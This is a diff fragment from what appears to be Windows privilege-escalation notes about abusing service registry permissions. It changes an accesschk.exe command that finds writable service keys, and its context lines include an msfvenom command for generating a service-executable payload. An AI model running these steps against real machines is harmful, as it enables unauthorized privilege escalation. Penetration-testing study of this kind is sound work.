@@ -231,7 +231,7 @@ Windows stores all the necessary data that is related to services in the registr
     * req query HKLM\SYSTEM\CurrentControlSet\Services\\\<servicename>
 
  * Find from which group is accessible this service
-    * accesschk.exe –kvusw hklm\System\CurrentControleSet\Service
+    * accesschk.exe /accepteula -uvwqk hklm\System\CurrentControleSet\Service\\\<servicename>
  
  * generate a payload:
    * msfvenom –p windows/exec CMD=\<Command> -f exe-services –o \<service binery>
